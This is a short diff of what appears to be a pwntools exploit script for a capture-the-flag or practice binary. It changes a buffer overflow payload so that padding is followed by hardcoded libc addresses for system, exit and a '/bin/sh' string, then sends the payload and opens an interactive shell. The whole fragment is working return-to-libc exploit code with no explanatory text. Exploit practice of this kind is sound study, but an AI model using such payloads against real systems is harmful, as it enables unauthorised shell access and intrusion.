@@ -14,9 +14,12 @@ systemplt =  0x400510
 # 0x400734
 binsh = 0x400734
 payload = "aaaabaaacaaadaaaeaaafaaa"
-payload += "\x10\x05\x40"
-#payload += "\x34\x07\x40"
-
+# system = 0x7ffff7e3fed0
+payload += "\xd0\xfe\xe3\xf7\xff\x7f"
+# exit = 0x7ffff7e35720
+payload += "\x20\x57\xe3\xf7\xff\x7f"
+# /bin/sh = 0x7ffff7f7ccee 
+payload += "\xee\xcc\xf7\xf7\xff\x7f"
 r.sendline(payload)
 r.interactive()
 
